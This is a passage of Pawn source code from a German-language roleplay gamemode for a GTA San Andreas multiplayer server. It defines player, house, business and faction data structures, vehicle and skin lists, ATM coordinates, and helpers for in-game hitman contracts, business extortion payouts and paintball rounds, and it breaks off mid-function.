new InCargo[MAX_PLAYERS];
new InLevi[MAX_PLAYERS];
new InEnfo[MAX_PLAYERS];
new gCarLock[265];
new noooc = 0;
new adds = 1;
new addtimer = 60000;
new objstore[128];
new cbjstore[128];
new ghour = 0;
new gminute = 0;
new gsecond = 0;
new numplayers = 0;
//new dollah = 200; // Amount player recieves on spawn.
new wtime = 15;
new deathcost = 1;
new callcost = 0; //20 seconds
new realchat = 1;
new timeshift = -1;
new shifthour;
//====== PILOTEN =======//
new LSAWaren;
new FarmerDrogen;
new ProdsDabei[MAX_PLAYERS];
new intrate = 1;
new levelexp = 4;
new cchargetime = 60;
new txtcost = 2;
new mapicons[MAX_PLAYERS];
new pickups;
new CIV[] = {7,19,20,23,73,101,122};
//new Float:ChangePos[MAX_PLAYERS][3];
new ChangePos2[MAX_PLAYERS][2];
//new Float:PlayerPos[MAX_PLAYERS][6];
new Float:TeleportDest[MAX_PLAYERS][3];
new Float:TelePos[MAX_PLAYERS][6];
// ==============================================================================================================================
/*
#define CLUCKIN_BELL_TEXT "Cluckin' Bell~n~~g~ Geh in das Dollarzeichen~n~und tippe /menu"
#define PIZZA_TEXT "Well Stacked Pizza~n~~g~ Geh in das Dollarzeichen~n~und tippe /menu"
#define BURGER_SHOT_TEXT "Burger Shot~n~~g~ Geh in das Dollarzeichen~n~und tippe /menu"

enum CPInfo
{
	Float:EnterX,
	Float:EnterY,
	Float:EnterZ,
	Float:EnterA,
	EnterInt,
	ExitingText[32],
	Float:ExitX,
	Float:ExitY,
	Float:ExitZ,
	Float:ExitA,
	ExitInt,
	EnteringText[100],
	EnteringPrice,
}
new MultipleEnter[MAX_PLAYERS];
new CheckPointing[MAX_PLAYERS];
new CheckPointShown[MAX_PLAYERS];
*/
// ==============================================================================================================================

#define MAX_FRACS 24
new Fracs[MAX_FRACS][20] = {
"LSPD",
"FBI",
"Bundeswehr",
"Sanitäter",
"LCM",
"Yakuza",
"Präsident",
"Hitman",
"San News",
"Transport GmbH",
"Fahrlehrer",
"Triaden",
"Grove",
"Ballas",
"Feuerwehr",
"Vagos",
"Aztecas",
"SF Rifa",
"Red Soldiers",
"Terroristen",
"Wheelmen Agency",
"S.W.A.T",
"Russen Mafia",
"Ordnungsamt"
};

new VehicleName[][] = {
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Firetruck",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulance",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi",
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer",
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster Truck",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer",
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Roller",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "Fahrrad",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Police Maverick",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer",
   "Hotring Racer",
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker",
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Traktor",
   "Combine",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Firetruck",
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck",
   "Monster Truck",
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight",
   "Trailer",
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer",
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer",
   "Trailer",
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "Streifenwagen",
   "Streifenwagen",
   "Streifenwagen",
   "Polizei Ranger",
   "Picador",
   "S.W.A.T Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer",
   "Luggage Trailer",
   "Stair Trailer",
   "Boxville",
   "Farm Plow",
   "Utility Trailer"
};


new Float:ATMs[][3] = {
{810.565063, -1623.768799, 13.189775},
{1000.825195, -922.610168, 41.971024},
{1504.693359, -1706.567749, 13.689775},
{1928.620850, -1771.269043, 13.189775},
{1036.071655, -1024.509766, 31.744461},
{926.909912, -1355.081421, 13.021199},
{491.439484, -1734.586548, 10.871187},
{380.780701, -2021.725830, 7.478837},
{1223.778320, -1744.292603, 13.240016},
{2105.436035, -1809.228516, 13.197587},
{2072.053955, -1836.951416, 13.197434},
{1956.735596, -2186.291016, 13.189775},
{2394.498047, -1914.865356, 13.189775},
{2779.040283, -1821.910034, 10.157268},
{1196.011841, -918.630188, 42.792793},
{743.2431,-1359.0447,13.5000},
{2126.1062,-1153.3546,23.9997},
{2466.1597,-1541.8282,24.2854},
{743.2431,-1359.0447,13.5000},
{2126.1062,-1153.3546,23.9997},
{2466.1597,-1541.8282,24.2854},
// Neue ATMs
{1837.208618, -1421.554077, 13.180400},
{1033.933228, -1339.474243, 13.344462},
{-1542.506592, -439.954376, 5.617899},
{-1967.163086, 278.601196, 34.784546},
//{-1648.825928, 1202.475342, 6.842899},
{-2627.958740, 1410.379517, 6.686649},
{-2725.872070, 2369.266602, 71.472687},
{1712.591553, 1617.526855, 9.625760},
{2023.364868, 997.874023, 10.438212},
{2282.881348, 2432.390381, 10.363214},
{2088.521484, 1510.274780, 10.438212},
{846.862244, -1803.118652, 13.229680},
{1458.4338, 2767.5984, 10.8203},
{303.970428, -1419.902466, 13.676299},
{1382.8409,-982.6934,5664.4189},
{1385.2269,-982.7946,5664.4189},
{1387.5823,-982.7953,5664.4189},
{1391.9039,-982.8713,5664.4189},
// neue amk
//{1493.4609,-1771.6350,18.7958},
//{2266.3472,2031.1355,10.8203},
//{1428.5902,-1022.8332,23.8281},
//{733.0350,-1348.2927,13.5101},
//{548.2454,-1260.3536,16.8345},
{732.40149, -1346.81604, 13.10907},
{549.33990, -1260.54529, 16.40424},
{2131.66577, -1151.33582, 23.68833},
{2266.11230, 2031.79199, 10.45267},
{-1967.21179, 278.57965, 34.80096},
{-1648.64197, 1202.48474, 6.85216},

{-573.7900,-1080.0065,23.5203},
//
{1380.6710,-982.8008,5664.4189}
};

//#define RunOutTime 30000
//#define RefuelWait 5000
#define SPRITPREIS 25



new Music[MAX_PLAYERS];
/*
new Songs[7][1] = {
{1187},
{1185},
{1183},
{1097},
{1076},
{1068},
{1062}
};
*/
new FishNamesNumber = 22;
new FishNames[22][20] = {
{"Jacke"},
{"Amberjack"},
{"Zackenbarsch"},
{"Roter Schnappfisch"},
{"Hose"},
{"Forelle"},
{"Blauer Marlin"},
{"Blume"},
{"Mackeral"},
{"Seebarsch"},
{"Schuhe"},
{"Hecht"},
{"Segelfisch"},
{"Müllsack"},
{"Tunfisch"},
{"Aal"},
{"Delphin"},
{"Hai"},
{"Schildkröte"},
{"Katzenfisch"},
{"Geldtasche"},
{"Schwertfisch"}
};

new Float:PaintballSpawns[4][3] = {
{2175.9280,1602.4275,999.9722},
{2176.0137,1585.1425,999.9722},
{2225.5876,1615.2679,999.9722},
{2192.6040,1618.2472,999.9722}
};

new Float:gMedPlayerSpawns[2][3] = {
{1178.1,-1321.0,14.1},
{1177.7,-1325.0,14.0}
};

enum pBoxingStats
{
    TitelName[128],
    TitelWins,
    TitelLoses,
};
new Titel[pBoxingStats];


enum pPaperInfo
{
	PaperUsed,
	PaperMaker[20],
	PaperTitle[64],
	PaperText1[128],
	PaperText2[128],
	PaperText3[128],
	PaperText4[128],
	PaperText5[128],
	PaperText6[128],
	PaperText7[128],
	SafeSaving,
};
new PaperInfo[10][pPaperInfo];

enum pPaper
{
	pMaker[20],
	pTitle[64],
	pLine1[128],
	pLine2[128],
	pLine3[128],
	pLine4[128],
	pLine5[128],
	pLine6[128],
	pLine7[128],
};
new Paper[MAX_PLAYERS][pPaper];


enum pFishing
{
	pFish1[20],
	pFish2[20],
	pFish3[20],
	pFish4[20],
	pFish5[20],
	pWeight1,
	pWeight2,
	pWeight3,
	pWeight4,
	pWeight5,
	pFid1,
	pFid2,
	pFid3,
	pFid4,
	pFid5,
	pLastFish,
	pFishID,
	pLastWeight,
};
new Fishes[MAX_PLAYERS][pFishing];

enum pCooking
{
	pCook1[20],
	pCook2[20],
	pCook3[20],
	pCook4[20],
	pCook5[20],
	pCWeight1,
	pCWeight2,
	pCWeight3,
	pCWeight4,
	pCWeight5,
	pCookID1,
	pCookID2,
	pCookID3,
	pCookID4,
	pCookID5,
};
new Cooking[MAX_PLAYERS][pCooking];

enum pGroceries
{
	pChickens,
	pChicken,
	pHamburgers,
	pHamburger,
	pPizzas,
	pPizza,
};

new Groceries[MAX_PLAYERS][pGroceries];

enum pSpec
{
	Float:Coords[3],
	Float:sPx,
	Float:sPy,
	Float:sPz,
	sPint,
	sLocal,
	sCam,
};

new Unspec[MAX_PLAYERS][pSpec];

enum eCars
{
	model_id,
	Float:pos_x,
	Float:pos_y,
	Float:pos_z,
	Float:z_angle,
};

enum hNews
{
	hTaken1,
	hTaken2,
	hTaken3,
	hTaken4,
	hTaken5,
	hAdd1[128],
	hAdd2[128],
	hAdd3[128],
	hAdd4[128],
	hAdd5[128],
	hContact1[128],
	hContact2[128],
	hContact3[128],
	hContact4[128],
	hContact5[128],
};
new News[hNews];



enum GangFightSys{
ZoneID,
Float:minx,
Float:miny,
Float:maxx,
Float:maxy,
Belongs2,
AttackerFaction,
ZeitBisNeueEinname,
Text3D:EinnahmeLabel,
FlaggenPickup,
Float:EinnahmeX,
Float:EinnahmeY,
Float:EinnahmeZ
};
new GfSystem[MAX_ZONES][GangFightSys];

enum pInfo
{
	pKey[128],
	pLevel,
	pMoney,
	pAdmin,
	tban,
	pSupporter,
    pLastOnline,
	pDonateRank,
    pLSD,
    pGras,
	gPupgrade,
	pConnectTime,
	pReg,
	pSex,
	pAge,
	pOrigin,
	pCK,
	pMuted,
	pMutedTime,
	pExp,
	pCash,
	pAccount,
	Float:pTx,
	Float:pTy,
	Float:pTz,
	pPlayerKreditDauer,
	pPlayerKredit,
	pCrimes,
	pKills,
	pDeaths,
	pArrested,
	pWantedDeaths,
	pPhoneBook,
	pLottoNr,
	pFishes,
	pBiggestFish,
	pJob,
	pPayCheck,
	pRest,
	pHeadValue,
	pPrison,
	pJailed,
	pTotTime,
	pJailTime,
	pGangJailed,
	pMauled,
	pMats,
 	sMember,
	pDrugs,
	pLeader,
	pMember,
	pFMember,
	pRank,
	pChar,
	pContractTime,
	pDetSkill,
	pSexSkill,
	pBoxSkill,
	pLawSkill,
	pMechSkill,
	pJackSkill,
	pCarSkill,
	pNewsSkill,
	pDrugsSkill,
	pCookSkill,
	pFishSkill,
	Float:pHealth,
	pSHealth,
	pInt,
	pLocal,
	pTeam,
	pModel,
	pPnumber,
	pHouseKey,
	pPbiskey,
	Float:pPos_x,
	Float:pPos_y,
	Float:pPos_z,
	pCarLic,
	pNewLic,
	pFlyLic,
	pBoatLic,
	pFishLic,
	pGunLic, //Definition des Scheines zb die Aufgabe später
	pLKWLic,
	pRollerLic,
	pMotoLic,
	pZig,
	pKekse,
	pZigSucht,
	pGun1,
	pGun2,
	pGun3,
	pGun4,
	pAmmo1,
	pAmmo2,
	pAmmo3,
    Haltestelle,
    Haltestelle2,
	pAmmo4,
	pCarTime,
	pMulltime,
	pPayDay,
	pPayDayHad,
	pCDPlayer,
	pWins,
	pLoses,
	pAlcoholPerk,
	pDrugPerk,
	pMiserPerk,
	pPainPerk,
	pTraderPerk,
	pTut,
	pWarns,
	Float:pGWD,
	pAdjustable,
	pFuel,
	pMarried,
	pMarriedTo[128],
	pInvWeapon,
	pInvAmmo,
	pInvWeapon2,
	pInvAmmo2,
	pInvDrugs,
	pInvMats,
	pFlugTime,
	pRoadblock,
	pPlayMinutes,
	pGesamtMinutes,
	pMinutesSinceLogin,
	pMinutesSinceAn,
	pSFPASS,
	pLVPASS,
	pHandyGeld,
	pHandyVer,
	pUhrID,
	pHandyID,
	pOwnPerso,
	pOwnAntrag,
	pPersoStop,
	pGehalt,
	pFrakSperre,
	pBoxMats,
	pBoxDrugs,
	pban,
	Text:LetterboxTop,Text:LetterboxBottom2, Text:LetterboxBottom,
	pBankrob,
	pTot,
	pFarmTime,
	pGDeaths,
	pGKills,
    pErstehilfe,
	pMeldung,
	pHitsound,
	pPtankekey,
	pZollPass,
	pZollPassTime,
	pGebannt,
	forumID,
	Name[MAX_PLAYER_NAME],
    pAdminTickets,
	pSkinauswahl,
	pVerreckt,
    pCarP,
	pAdministrativGutschein[128],
	pBanGrund[128],
	pBanAdmin[128],
	pBanDauer[128],
	pLastVehicle,
	pCurrentState,
	pHelm,
	pWeather,
	paMuted,
	paMutedTime,
	pAuftrag,
	pCarkeys,
	//
	pSeller,
	pAngebot,
	pKaufPreis,
	pMenge,
	pVerbrauch,
	//
	pOrgMember,
	pOrgRang,
	pGutschein,
	pOrgLeader,
	pIsPlayerProjektleiter,
	pWBB4ID,
	pAdminPasswort,//Belegt
	pichmusskuedigen,
    ForumID,
	pTempOrgName[128],
	pAutoFarbe,
	pKek9,
	pCheckAcc,
	pPrisonCPs,
	pWBBid,
	pHzreb83[128],
	pTempPassword[128],
	pFightingStyle,
	pCreateBiz,
	pBizID,
	pStoreAusrauben,
	pHouseKey1,
	pHouseKey2,
	pHouseKey3,
	pHouseKey4,
	pTemp,
	pRobstore,
	pBomben,
	pGenerellFreezed,
	AktivImEvent,
	EventKills,
	FraktionsSperre[23],
	pSpielerWiederbelebt

};
new PlayerInfo[MAX_PLAYERS][pInfo];

enum gzInfo
{
	gzID,
	Float:x1,
	Float:x2,
	Float:y1,
	Float:y2,
	owner,
	attacked,
	Float:ix,
	Float:iy,
	Float:iz,
}
new GangZones[7][gzInfo];
new GangZones_Index = 7;
#define MAX_HOUSE 995
enum hInfo
{
	hCreated,
    Float:hEntrancex,
    Float:hEntrancey,
    Float:hEntrancez,
    Float:hExitx,
    Float:hExity,
    Float:hExitz,
    hOwner[128],
    hDiscription[128],
    hValue,
    hHel,
    hArm,
    hInt,
    hLock,
    hOwned,
    hRooms,
    hRent,
    hRentabil,
    hTakings,
    hDate,
    hLevel,
    Text3D:h_text,
	hPickup,
};
new HouseInfo[MAX_HOUSE][hInfo];


#define MAX_BIZZ 400
enum bInfo
{
	bCreated,
    bOwned,
    bOwner[128],
    bMessage[128],
    bExtortion[128],
    Float:bEntranceX,
    Float:bEntranceY,
    Float:bEntranceZ,
    Float:bExitX,
    Float:bExitY,
    Float:bExitZ,
    Float:bExitR,
    bLevelNeeded,
    bBuyPrice,
    bEntranceCost,
    bTill,
    bLocked,
    bInterior,
    bDate,
    bProducts,
    bMaxProducts,
    bPriceProd,
    Text3D:B_text,
	bPickup,
	bTyp
//	bRobx,
//	bRoby,
//	bRobz,
//	bRobMarker
};
new BizzInfo[MAX_BIZZ][bInfo];

#define MAX_SBIZZ 80 //
enum sbInfo
{
    sbCreated,
    sbOwned,
    sbOwner[128],
    sbMessage[128],
    sbExtortion[128],
    Float:sbEntranceX,
    Float:sbEntranceY,
    Float:sbEntranceZ,
    sbLevelNeeded,
    sbBuyPrice,
    sbEntranceCost,
    sbTill,
    sbLocked,
    sbInterior,
    sbProducts,
    sbMaxProducts,
    sbPriceProd,
    sbDate,
    Text3D:sB_text,
    sbPickup// Komma war hier Vorher ? o_O ,
};
new SBizzInfo[MAX_SBIZZ][sbInfo];


#define MAX_FUELSTATION 400 //
enum tInfo
{
	tCreated,
	tOwned,
	tOwner[128],
	tMessage[128],
	tExtortion[128],
	Float:tEntranceX,
	Float:tEntranceY,
	Float:tEntranceZ,
	tLevelNeeded,
	tBuyPrice,
	tEntranceCost,
	tTill,
	tLocked,
	tInterior,
	tProducts,
	tMaxProducts,
	tPriceProd,
	tPickup,
	TDBID,
	Text3D:t_text
};

new TankeInfo[MAX_FUELSTATION][tInfo];
//new Text3D: text_tanke[MAX_FUELSTATION];
new tankestring[500];

new frakbasetring[500];

#define MAX_FRAKS 80 //
enum fInfo
{
    fMessage[128],
    Float:fEntranceX,
    Float:fEntranceY,
    Float:fEntranceZ,
    Float:fExitX,
    Float:fExitY,
    Float:fExitZ,
	fInterior,
	fCreated,
	fFrak,
	fOpen,
	fDrugsPrice,
	fMatsPrice,
	fMats,
	fDrugs,
    Text3D:f_text,
    fPickup,
    BombeAktiv,
    BombeZeit,
    BombeAutoID,
    BombeVon
};
new FrakInfo[MAX_FRAKS][fInfo];




enum pHaul
{
	pCapasity,
	pLoad,
};

new PlayerHaul[500][pHaul];

enum pCrime
{
	pBplayer[32],
	pAccusing[32],
	pAccusedof[32],
	pVictim[32],
};
new PlayerCrime[MAX_PLAYERS][pCrime];

enum mInfo
{
    mTitle[128],
    mText1[128],
    mText2[128],
    mText3[128],
    mText4[128],
    mText5[128],
    mText6[128],
    mText7[128],
    mText8[128],
    mText9[128],
    mText10[128],
    mText11[128],
    mText12[128],
    mText13[128],
    mText14[128],
    mText15[128],
    mText16[128],
    mText17[128],
    mText18[128],
    mGText1[128],
    mGText2[128],
    mGText3[128],
    mGText4[128],
    mGText5[128],
    mGText6[128],
	Float:mCP1[3],
	Float:mCP2[3],
	Float:mCP3[3],
	Float:mCP4[3],
	Float:mCP5[3],
	Float:mCP6[3],
	mReward,
	mToggle,
};

enum kInfo
{
    kTitle[128],
    kMaker[MAX_PLAYER_NAME],
    kText1[128],
    kText2[128],
    kText3[128],
    kText4[128],
    kText5[128],
    kText6[128],
    kText7[128],
    kText8[128],
    kText9[128],
    kText10[128],
    kText11[128],
    kText12[128],
    kText13[128],
    kText14[128],
    kText15[128],
    kText16[128],
    kText17[128],
    kText18[128],
    kGText1[128],
    kGText2[128],
    kGText3[128],
    kGText4[128],
    kGText5[128],
    kGText6[128],
	Float:kCP1[3],
	Float:kCP2[3],
	Float:kCP3[3],
	Float:kCP4[3],
	Float:kCP5[3],
	Float:kCP6[3],
	kNumber,
	kReward,
	kToggle,
};

enum iInfo
{
	iAdmin[128],
	iMOTD[128],
	iPassword[128],
	iNeedPass,
	iLock,
	iPlayers,
};
new IRCInfo[10][iInfo];

new GunPrice[30][1] = {
{75}, //parachute
{75}, //golfclub
{75}, //nightstick
{75}, //knife
{75}, //baseballbat
{100}, //shovel
{75}, //poolcue
{50}, //purpledildo
{50}, //whitedildo
{50}, //longwhitedildo
{50}, //whitedildo2
{50}, //flowers
{600}, //cane
{300}, //sdpistol
{300}, //colt45
{500}, //deagle
{99999}, //Tec9
{99999}, //uzi
{1000}, //mp5
{750}, //shotgun
{1500}, //spas12//
{1500}, //sawnoff//
{1500}, //ak47
{1500}, //m4
{2000}, //sniper
{7}, //pistolammo
{7}, //shotgunammo
{9}, //smgammo
{10}, //assaultammo
{20} //sniper
};

new JoinPed[118][1] = {// 52 57
{163},  // LSPD 0
{164},  // LSPD 1
{265},  // LSPD 2
{266},  // LSPD 3
{267},  // LSPD 4
{280},  // LSPD 5
{281},  // LSPD 6
{282},	// LSPD 7
{283},  // LSPD 8
{284},  // LSPD 9
{165},	// SFPD 10 Leaderskin 286
{166},  // SFPD 11
{286},  // SFPD 12
{294},  // SFPD 13
{287},  // Bundeswehr 14
{285},  // Bundeswehr 15
{148},  // Bundeswehr 16
{70},	// MEDIC 17
{274},	// MEDIC 18
{276},	// MEDIC 19
{127},	// LCN 20
{126},	// LCN 21
{125},	// LCN 22
{124},	// LCN 23
{113},	// LCN 24  nein können sie nich
{111},	// LCN 25
{98},	// LCN 26
{93},	// LCN 27
{120},	// YAKI 28
{121},	// YAKI 29
{122},	// YAKI 30
{123},	// YAKI 31
{186},	// YAKI 32
{228},	// YAKI 33
{169},	// YAKI 34
{141},	// PRÄSI 35
{147},	// PRÄSI 36
{137},	// HITMAN 37 93
{230},	// HITMAN 38
{186},	// HITMAN 39
{141},	// HITMAN 40
{93},	// HITMAN 41
{188},	// San News 42 Leaderskin 188
{250},	// San News 43
{170},	// San News 44
{72},  // Transport GMBH 45
{133},	// Transport GMBH 46
{134},   // Transport GMBH 47
{59},   // FAHRSCHULE 48
{60},   // FAHRSCHULE 49
{150},  // FAHRSCHULE 50
{76},   // FAHRSCHULE 51
{100},	// BIKER 52
{247},	// BIKER 53
{248},	// BIKER 54
{254},	// BIKER 55
{248},	// BIKER 56
{131},  // BIKER 57
{105},	// Grove 58
{106},	// Grove 59
{107},	// Grove 60
{269},	// Grove 61
{270},	// Outls 62
{271},	// Grove 63
{191},  // Grove 64
{102},	// Ballas 65
{195},	// Ballas 66
{104},	// Ballas 67
{193},  // Ballas 68
{277},	// FaF 69
{278},	// FaF 70
{279},	// FaF 71
{278},	// FaF 72
{277},  // FaF 73
{108},	// Vagos 74
{109},	// Vagos 75
{110},	// Vagos 76
{226},  // VagosVagos 77
{114},	// Aztecas 78
{115},	// Aztecas 79
{116},	// Aztecas 80
{298},	// Aztecas 81
{173},	// RIFA 82
{174},	// RIFA 83
{175},	// RIFA 84
{214},  // RIFA 85
{170},	// WCC 86
{193},	// WCC 87
{180},	// WCC 88
{189},	// WCC 89
{19},	// WCC 90
{299},	// Wheel 91
{28},	// Wheel 92
{29},	// Wheel 93
{30},	// Wheel 94
{47},   // Wheel 95
{277},	// FEUERWEHR 96
{278},	// FEUERWEHR 97
{279},	// FEUERWEHR 98
{272},	// RM 99
{125},	// RM 100
{126},  // RM 101
{8},	// OAMT 102
{50},	// OAMT 103
{71},	// OAMT 104
{224},  //Triaden 105 Frau
{118},	//Triaden 106
{120},	//Triaden 108
{122},   //Triaden 109
{229},   //Triaden 110
{263},   //Triaden 111 Frau
{49},   //Triaden 112 Opa
{112},   //Triaden 11
{165},   //FBI
{166},   //FBI
{286},   //FBI
{294},   //FBI
{280}   //FBI
};


new Peds[206][1] = {
{2},
{247},
{248},{100},{256},{263},{262},{261},{260},{259},{258},{257},{256},{255},
{253},{252},{251},{249},{246},{245},{244},{243},{242},{241},{240},{239},
{238},{237},{236},{235},{234},{233},{232},{231},{230},{229},
{226},{225},{173},{174},{175},{224},{223},{222},{221},{220},{219},{218},
{217},{216},{215},{214},{213},{212},{211},{210},{209},
{207},{206},{205},{204},{203},{202},{201},{200},{199},{198},{197},{196},
{195},{194},{193},{192},{191},{190},{189},{185},{184},{183},
{182},{181},{180},{179},{178},{176},{172},{170},{168},{167},{162},
{161},{160},{159},{158},{157},{156},{155},{154},{153},{152},{151},
{146},{145},{144},{143},{142},{141},{140},{139},{138},{137},{136},{135},
{134},{133},{132},{131},{130},{129},{128},{254},{99},{97},{96},{95},{94},
{92},{90},{89},{88},{87},{85},{84},{83},{82},{81},{80},{79},{78},{77},{76},
{75},{73},{72},{69},{68},{67},{66},{64},{63},{62},{58},{57},{56},{55},
{54},{53},{52},{51},{50},{49},{45},{44},{43},{41},{39},{38},{37},{36},{35},
{34},{33},{32},{31},{30},{29},{28},{27},{26},{25},{24},{23},{22},{21},{20},
{19},{18},{17},{16},{15},{14},{13},{12},{11},{10},{1},{2},
{290},//ROSE
{291},//PAUL
{292},//CESAR
{293},//OGLOC
{187},
{296},//JIZZY
{297},//MADDOGG
{298},//CAT
{299}//ZERO
};

//------------------------------------------------------------------------------------------------------
main()
{
	print("_______________________________________");
	print("Das Script wurde Vollständig geladen!");
	print(" German Reallife: LS/SF/LV");
	print("_______________________________________");
	print(" ");
}
//------------------------------------------------------------------------------------------------------


Function PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}




Function Float:GetDistanceBetweenPlayers(pd1,pd2)
{

	new Float:xf1,Float:yf1,Float:zf1,Float:xf2,Float:yf2,Float:zf2;
	if(!IsPlayerConnected(pd1) || !IsPlayerConnected(pd2))
	{
		return -1.00;
	}
	GetPlayerPos(pd1,xf1,yf1,zf1);
	GetPlayerPos(pd2,xf2,yf2,zf2);
	return floatsqroot(floatpower(floatabs(floatsub(xf2,xf1)),2)+floatpower(floatabs(floatsub(yf2,yf1)),2)+floatpower(floatabs(floatsub(zf2,zf1)),2));

}


Function SearchingHit(playerid)
{
	new string[256], name[MAX_PLAYER_NAME];
	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Hitman Agency News __________________|");
    SendClientMessage(playerid, COLOR_DBLUE, "*** Neue Nachricht: Ein neuer Auftrag ist verfügbar!. ***");
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pHeadValue] > 0)
		    {
		        GetPlayerName(i, name, sizeof(name));
                format(string, sizeof(string), "Person: %s   ID: %d   Preis: $%d", name, i, PlayerInfo[i][pHeadValue]);
				SendClientMessage(playerid, COLOR_DBLUE, string);
		    }
		}
	}
	SendClientMessage(playerid, COLOR_WHITE, "|________________________________________________________|");
	return 0;
}
/*
Function bombe2()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(GetPVarInt(i, "Bombe2"))
		{
			CreateExplosion(1388.7212,-992.2722,5651.8315, 7, 10);
			DestroyDynamicObject(d1);
			DestroyDynamicObject(d2);
			DestroyDynamicObject(d3);
			DestroyDynamicObject(d4);
            SendClientMessage(i, COLOR_RED, "Die Bombe ist hochgegangen!");
			SetPVarInt(i, "Bombe2", 0);
			return 1;
		}
	}
	return 1;
}
*/
Function ExtortionBiz(bizid, money)
{
    new string[256];
    format(string, sizeof(string), "Niemand");
    if(strcmp(BizzInfo[bizid][bExtortion],string, true ) == 0 )
	{
	    return 0;
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new name[MAX_PLAYER_NAME];
			new wstring[MAX_PLAYER_NAME];
			GetPlayerName(i, name, sizeof(name));
			format(string, sizeof(string), "%s", name);
			strmid(wstring, string, 0, strlen(string), 255);
			if(strcmp(BizzInfo[bizid][bExtortion] ,wstring, true ) == 0 )
			{
			    new value = money / 300;
			    value = value * 10;
			    GivePlayerMoneySave(i, value);
			    BizzInfo[bizid][bTill] -= value;
			}
		}
	}
	return 1;
}
Function ExtortionSBiz(bizid, money)
{
    new string[256];
    format(string, sizeof(string), "Niemand");
    if(strcmp(SBizzInfo[bizid][sbExtortion],string, true ) == 0 )
	{
	    return 0;
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new name[MAX_PLAYER_NAME];
			new wstring[MAX_PLAYER_NAME];
			GetPlayerName(i, name, sizeof(name));
			format(string, sizeof(string), "%s", name);
			strmid(wstring, string, 0, strlen(string), 255);
			if(strcmp(SBizzInfo[bizid][sbExtortion] ,wstring, true ) == 0 )
			{
			    new value = money / 100;
			    value = value * 10;
			    GivePlayerMoneySave(i, value);
			    SBizzInfo[bizid][sbTill] -= value;
			}
		}
	}
	return 1;
}
Function PreparePaintball()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerPaintballing[i] != 0)
	        {
	            SendClientMessage(i, COLOR_YELLOW, "Paintball startet in 20 Sekunden.");
	        }
		}
	}
 	SetTimer("StartPaintball", 20000, 0);
	return 1;
}

Function StartPaintball()
{
	PaintballRound = 1;
	StartingPaintballRound = 0;
	PaintballWinner = 999;
	PaintballWinnerKills = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerPaintballing[i] != 0)
	        {
	            ResetPlayerWeapons(i);
	            ServerWeapon(i, 24, 999);
